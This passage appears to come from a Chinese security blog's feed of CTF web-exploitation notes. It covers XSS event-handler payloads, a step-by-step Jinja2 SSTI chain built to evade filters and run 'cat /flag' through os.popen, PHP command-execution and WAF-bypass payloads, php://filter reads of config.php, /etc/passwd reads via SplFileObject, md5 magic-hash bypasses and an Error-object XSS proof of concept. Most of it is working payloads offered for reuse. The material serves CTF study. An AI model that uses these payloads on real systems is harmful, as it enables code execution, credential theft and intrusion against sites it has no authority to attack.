class="line">对象获得焦点时发生：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(1);</span>&gt;</span></span><br><span class="line">对象失去焦点时</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">无需用户去触发：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(1);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot; οnclick=alert(1)&gt;        需要点击一下输入框</span><br><span class="line">&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框</span><br></pre></td></tr></table></figure><p>&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">alert(1);</span>&gt;</span></span><br><span class="line"></span><br><span class="line">使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(1);</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&lt;svg&gt; 标签用来在HTML页面中直接嵌入SVG 文件的代码。<code>&lt;svg onload=alert(1);&gt;</code></p><p>&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。<code>&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;</code></p><p>&lt;body&gt; 标签定义文档的主体。<code>&lt;body onload=alert(1);&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="/article/ssti/"/>
      <url>/article/ssti/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="判断漏洞"><a class="header-anchor" href="#判断漏洞">¶</a>判断漏洞</h2><p>未过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 看Flask框架基本上会有SSTI, 如果输出49则证明有漏洞</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 双花括号被过滤, 用&#123;%%&#125;</span><br><span class="line">&#123;%print 123%&#125;</span><br><span class="line"></span><br><span class="line">// 数字被过滤, 通过if条件来判断: &#123;%if 条件%&#125;result&#123;%endif%&#125;</span><br><span class="line">&#123;%if not a%&#125;yes&#123;%endif%&#125;</span><br><span class="line">// 数字被过滤, 构造payload先获取数字然后将数字变为乘法运算</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(three*eight)%&#125;</span><br><span class="line"></span><br><span class="line">// 部分关键词被过滤, 例如:</span><br><span class="line">&#123;%set popen=dict(popen=a)|join%&#125;</span><br><span class="line">// 换成</span><br><span class="line">&#123;%set pp=dict(po=a,pen=b)|join%&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>如果if的条件正确, 就会输出result, 否则输出空观察页面是否输出yes, 如果输出yes, 则代表有漏洞, 其中, 语句中的a默认是false, 前&gt;面加一个not就是true</p></blockquote><h2 id="获取数字"><a class="header-anchor" href="#获取数字">¶</a>获取数字</h2><p>先测试是否数字被过滤,如无过滤跳过这一步</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%set one=dict(c=a)|join|count%&#125;</span><br><span class="line">&#123;%set two=dict(cc=a)|join|count%&#125;</span><br><span class="line">&#123;%set three=dict(ccc=a)|join|count%&#125;</span><br><span class="line">&#123;%set four=dict(cccc=a)|join|count%&#125;</span><br><span class="line">&#123;%set five=dict(ccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%set six=dict(cccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%set seven=dict(ccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%set eight=dict(cccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%set nine=dict(ccccccccc=a)|join|count%&#125;</span><br><span class="line">&#123;%print (one,two,three,four,five,six,seven,eight,nine)%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240310155927535.png" alt="image-20240310155927535"></p><h2 id="拼接payload"><a class="header-anchor" href="#拼接payload">¶</a>拼接payload</h2><p>先确定payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(lipsum|attr(&quot;__globals__&quot;).get(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></pre></td></tr></table></figure><h3 id="思路"><a class="header-anchor" href="#思路">¶</a>思路</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果数字被过滤, 获取数字</span><br><span class="line"></span><br><span class="line">获得__globals__ </span><br><span class="line">---&gt; 从lipsum|string|list中获取下划线 </span><br><span class="line">---&gt; 使用pop()方法pop方法可以根据索引值来删除列中的某个元素并将该元素返回值返回</span><br><span class="line"></span><br><span class="line">获取os模块</span><br><span class="line">---&gt; 使用get方法</span><br><span class="line"></span><br><span class="line">获取popen方法</span><br><span class="line">---&gt; 获取popen字段</span><br><span class="line"></span><br><span class="line">获取flag</span><br><span class="line">---&gt; 获得chr函数通过chr函数来获得命令的每个字符</span><br><span class="line">---&gt; 获取__builtins__通过(lipsum|attr(&quot;__globals__&quot;)).get(&quot;__builtins__&quot;).get(&quot;chr&quot;)</span><br><span class="line">---&gt; 获取read执行shell命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="获取-pop"><a class="header-anchor" href="#获取-pop">¶</a>获取 pop</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 显示 pop 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%print pop%&#125;</span><br></pre></td></tr></table></figure><h4 id="查看-string-表"><a class="header-anchor" href="#查看-string-表">¶</a>查看 string 表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// _ 会在第 24 个</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)%&#125;&#123;%print xiahuaxian%&#125;</span><br></pre></td></tr></table></figure><h4 id="利用-pop-获取下划线"><a class="header-anchor" href="#利用-pop-获取下划线">¶</a>利用 pop 获取下划线</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 显示 _ 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;&#123;%print xiahuaxian%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取-globals"><a class="header-anchor" href="#获取-globals">¶</a>获取__globals__</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 显示 __globals__ 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%print globals%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取-get"><a class="header-anchor" href="#获取-get">¶</a>获取 get</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 显示 get 成功</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%print get%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取os模块"><a class="header-anchor" href="#获取os模块">¶</a>获取os模块</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 显示 &lt;module &#x27;os&#x27; from &#x27;/usr/local/lib/python3.8/os.py&#x27;&gt; 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%set shell=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%print (lipsum|attr(globals))|attr(get)(shell)%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取popen字段"><a class="header-anchor" href="#获取popen字段">¶</a>获取popen字段</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 显示 popen 成功</span><br><span class="line">&#123;%set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;%print popen%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取popen方法"><a class="header-anchor" href="#获取popen方法">¶</a>获取popen方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 返回 &lt;function popen at 0x...&gt; 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%set shell=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取-builtins"><a class="header-anchor" href="#获取-builtins">¶</a>获取__builtins__</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 返回 __builtins__ 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%print builtins%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取-chr-函数"><a class="header-anchor" href="#获取-chr-函数">¶</a>获取 chr 函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 返回 &lt;built-in function chr&gt; 成功</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%&#125;</span><br><span class="line">&#123;%print char%&#125;</span><br></pre></td></tr></table></figure><h4 id="拼接-shell-命令"><a class="header-anchor" href="#拼接-shell-命令">¶</a>拼接 shell 命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 返回 cat /flag 成功(此处执行命令为 cat /flag)</span><br><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%&#125;</span><br><span class="line">&#123;%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%&#125;</span><br><span class="line">&#123;%print command%&#125;</span><br></pre></td></tr></table></figure><h4 id="获取read"><a class="header-anchor" href="#获取read">¶</a>获取read</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 返回 read 成功</span><br><span class="line">&#123;%set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;%print read%&#125;</span><br></pre></td></tr></table></figure><h2 id="执行-shell-payload"><a class="header-anchor" href="#执行-shell-payload">¶</a>执行 shell ( payload )</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%&#125;</span><br><span class="line">&#123;%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set get=dict(get=a)|join%&#125;</span><br><span class="line">&#123;%set shell=dict(o=a,s=b)|join%&#125;</span><br><span class="line">&#123;%set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%&#125;</span><br><span class="line">&#123;%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(dict(chr=a)|join)%&#125;</span><br><span class="line">&#123;%set command=char(99)+char(97)+char(116)+char(32)+char(47)+char(102)+char(108)+char(97)+char(103)%&#125;</span><br><span class="line">&#123;%set read=dict(read=a)|join%&#125;&#123;%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%&#125;</span><br></pre></td></tr></table></figure><h2 id="其他方式"><a class="header-anchor" href="#其他方式">¶</a>其他方式</h2><p><a href="https://github.com/Marven11/Fenjing">Fenjing一把梭</a></p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> 模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/article/php/"/>
      <url>/article/php/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>&quot;换&quot;变量绕过</h1><p>当php进行解析时，如果变量名前面有空格，php会自动去掉前面的空格再进行解析</p><p>所以, 假如 waf 不允许 <code>num</code> 变量接收字母，那么使用 <code>  num</code> 就可以（前面有个空格）</p><p>同理, 当 <code>?num=phpinfo()</code> 报错，那就试试<code>? num=phpinfo()</code></p><h1>弱比较和强比较</h1><table><thead><tr><th>类型</th><th>常见</th><th>原因</th></tr></thead><tbody><tr><td>弱比较</td><td><code>==</code>, <code>!=</code></td><td>在比较时会把两边转化为同一类型然后比较值是否相等<br />比较一个数字和字符串或者比较涉及到数字内容的字符串，会被转换成数值并且比较按照数值来进行,舍弃字母</td></tr><tr><td>强比较</td><td><code>===</code></td><td>等号两边类型和值必须都相等，否则返回&quot;false&quot;</td></tr></tbody></table><blockquote><p>数值转化规则：在转化时，PHP会从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符（不包含小数点, e, E）</p><p>在遇到e、E时，会按科学计数法处理</p></blockquote><h1>常见过滤绕过</h1><p>部分字符被绕过可以用ascii码进行转换绕过(方法不止一种)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对目录进行扫描</span><br><span class="line">?num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">字符串全变</span><br><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a class="header-anchor" href="#命令执行">¶</a>命令执行</h2><p>过滤了system，那我们换成 passthru, echo, eval 等</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">利用 php 的 echo：</span><br><span class="line">?c=”echo `tac config.php`;&quot;</span><br><span class="line">echo file_get_contents(‘config.php’);</span><br><span class="line"></span><br><span class="line">利用其他函数同上:</span><br><span class="line">?c=passthru(‘cat config.php’);</span><br><span class="line">?c=passthru(‘config.php’);</span><br><span class="line">?c=show_source(“config.php”);</span><br><span class="line"></span><br><span class="line">利用php伪协议读取文件：</span><br><span class="line">?c=include(&quot;php://filter/convert.base64-encode/resource=config.php&quot;);</span><br><span class="line"></span><br><span class="line">字符串拼接：?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);</span><br><span class="line"></span><br><span class="line">字符串取反构造</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;ls&#x27;);</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;cat config.php&#x27;);</span><br></pre></td></tr></table></figure><p>这个是system取反得到的，脚本实现方法是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=~(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是passthru：其中?&gt;闭合前面的php语句,阻断后面的语句继续执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passthru(‘tac \`ls\`’);?&gt;</span><br></pre></td></tr></table></figure><p>一些隔断：<code>?c=passthru('tac confi\*\*\*hp');</code><code>?c=passthru('tac confi/hp');</code></p><p>模糊匹配：当当前路径下只有一个c开头的config.php文件，<code>passthru('tac c*')?&gt;</code></p><p>前面是语句，后面是恶意代码, 这样就可以自动取得a并且执行了<code>?c= include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php</code></p><p>或者用hackbar, 然后POST中输入a=cat config.php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `$_POST[a]`;</span><br></pre></td></tr></table></figure><h2 id="md5-string-raw"><a class="header-anchor" href="#md5-string-raw">¶</a>md5(string,raw)</h2><h3 id="弱比较"><a class="header-anchor" href="#弱比较">¶</a>弱比较</h3><p>用数组和0e方法绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line">0e591948146966052067035298880982</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><h3 id="两次MD5"><a class="header-anchor" href="#两次MD5">¶</a>两次MD5</h3><p>这个一般都是弱比较, 也有两次md5加密后还是0e开头的</p><table><thead><tr><th style="text-align:left">原字符串</th><th>一次MD5</th><th>两次MD5</th></tr></thead><tbody><tr><td style="text-align:left">CbDLytmyGm2xQyaLNhWn</td><td>0ec20b7c66cafbcc7d8e8481f0653d18</td><td>0e3a5f2a80db371d4610b8f940d296af</td></tr><tr><td style="text-align:left">770hQgrBOjrcqftrlaZk</td><td>0e689b4f703bdc753be7e27b45cb3625</td><td>0e2756da68ef740fd8f5a5c26cc45064</td></tr><tr><td style="text-align:left">7r4lGXCH2Ksu2JNT3BYM</td><td>0e269ab12da27d79a6626d91f34ae849</td><td>0e48d320b2a97ab295f5c4694759889f</td></tr></tbody></table><h3 id="md5与自身相等"><a class="header-anchor" href="#md5与自身相等">¶</a>md5与自身相等</h3><p>0e215962017</p><h3 id="强比较"><a class="header-anchor" href="#强比较">¶</a>强比较</h3><p>依然是数组绕过, 当数组绕过不成立, 就用工具构造md5碰撞</p><h3 id="strings强转"><a class="header-anchor" href="#strings强转">¶</a>strings强转</h3><p>利用工具直接构造md5相等的字符串</p><p>如果限制了a和b的长度, <strong>利用浮点数的小数点精度问题, string强转后会构造出相同的字符串</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">0.500000000000004</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">string</span>)<span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable">$a</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;a == b&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241111120758.png" alt="image.png"></p><p>还有更极端一点的, 比如长度必须小于等于三且三个部分不相等</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="number">0e-10</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;.1&#x27;</span>;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="number">0.1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = (<span class="keyword">string</span>)<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$s</span> = (<span class="keyword">string</span>)<span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$d</span> != <span class="variable">$s</span>) &amp;&amp; (<span class="variable">$d</span> != <span class="variable">$b</span>) &amp;&amp; (<span class="variable">$s</span> != <span class="variable">$b</span>)) &#123;</span><br><span class="line">   <span class="variable">$dsb</span> = <span class="variable">$d</span>.<span class="variable">$s</span>.<span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dsb</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">string</span>)<span class="variable">$dsb</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable">$dsb</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$ctf</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;always equal md5&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="intval-绕过"><a class="header-anchor" href="#intval-绕过">¶</a>intval()绕过:</h2><p>PHP_5 和PHP_7 的 intval() 规则不一样</p><p>PHP_5中，intval() 会按照数值转化规则（从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符), 很多能用的漏洞都要求php版本正确</p><ul><li>运算</li><li>URL编码</li><li>ASCII编码</li><li>SQL注入</li><li>Power函数</li><li>取反</li><li>引号包裹</li><li>内联注释</li></ul><h3 id="Intval-id-num"><a class="header-anchor" href="#Intval-id-num">¶</a>Intval($id)&gt;num</h3><ul><li>单引号绕过：’1000’</li><li>计算绕过：500/0.5</li><li>函数绕过：power(10,3)</li><li>连接符绕过：?id=100||id=1000</li><li>取反两次绕过：id=~~1000</li><li>二进制绕过：0b1111101000</li><li>其他：?id=/**/1000</li></ul><h1>php内置类</h1><h2 id="Error-Exception进行XSS-绕过Hash比较"><a class="header-anchor" href="#Error-Exception进行XSS-绕过Hash比较">¶</a>Error, Exception进行XSS, 绕过Hash比较</h2><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><p>需要有报错的情况:</p><ul><li>Error: 适用于 PHP 7</li><li>Exception: 适用于PHP 5和7</li></ul><h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 测试代码</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//poc</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的话会弹出窗口显示<code>xss</code></p><h3 id="Hash绕过"><a class="header-anchor" href="#Hash绕过">¶</a>Hash绕过</h3><p>这两个异常对象是不同的（异常代码不同）但<code>__toString()</code>方法的输出的结果一模一样</p><p>**<em>__toString 返回的数据包含当前行号**</em>所以要在同一行写该类调用</p><p>例题: <a href="https://so.csdn.net/so/search?q=%5B2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DGreatphp&amp;t=&amp;u=&amp;urw=">[2020 极客大挑战]Greatphp</a></p><h2 id="内置类读目录-文件"><a class="header-anchor" href="#内置类读目录-文件">¶</a>内置类读目录, 文件</h2><ul><li>Directorylterator (PHP 5, PHP 7, PHP 8)</li></ul><p>DirectoryIterator与glob://协议结合可以进行目录读取, 显示出当前目录下的文件信息</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取到根目录的文件</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span>(glob:<span class="comment">///*);</span></span><br></pre></td></tr></table></figure><ul><li>FilesystemIterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)FilesystemIterator继承自DirectoryIterator,基本是一样的语法, 但这个类会以绝对路径形式展现</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 root 下文件</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span>(glob:<span class="comment">///root/*);</span></span><br></pre></td></tr></table></figure><ul><li>Globlterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)和上面两个差不多, 以绝对路径形式展现, 可以通过模式匹配来寻找文件路径</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 bin 下的文件</span></span><br><span class="line"><span class="title function_ invoke__">Globlterator</span>(/bin<span class="comment">/*);</span></span><br></pre></td></tr></table></figure><ul><li>SplFileObject (PHP 5 &gt;= 5.1.0, PHP 7, PHP 8)读取文件内容</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 /etc/passwd 文件内容</span></span><br><span class="line"><span class="built_in">SplFileObject</span>(/etc/passwd);</span><br></pre></td></tr></table></figure><h2 id="SimpleXMLElement-XXE"><a class="header-anchor" href="#SimpleXMLElement-XXE">¶</a>SimpleXMLElement - XXE</h2><p>远程包含xml文件</p><h2 id="SoapClient-SSRF"><a class="header-anchor" href="#SoapClient-SSRF">¶</a>SoapClient - SSRF</h2><p>适用于 PHP 5、PHP 7、PHP 8, 只局限于http、https协议</p><h2 